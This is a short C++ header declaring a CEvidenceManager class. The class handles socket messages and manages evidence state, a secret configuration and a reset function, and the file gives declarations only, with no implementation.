#ifndef __TSPSERVER__EVIDENCEMANAGE__H__
#define __TSPSERVER__EVIDENCEMANAGE__H__

#include "Manager.h"
#include "Evidence.h"

class CEvidenceManager : public CManager
{
public:
	CEvidenceManager(CClientSocket *pClient);
	virtual ~CEvidenceManager(void);

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	BOOL SetSingleSign(LPCSTR lpFileName);

private:
	UINT SendEvidenceState(BOOL bFirst = FALSE);
	void SetSecretConfig(LPBYTE pInfo, int nSize);
	BOOL ResetEvident();

private:
	CEvidence *m_pEvidence;
};

#endif//__TSPSERVER__EVIDENCEMANAGE__H__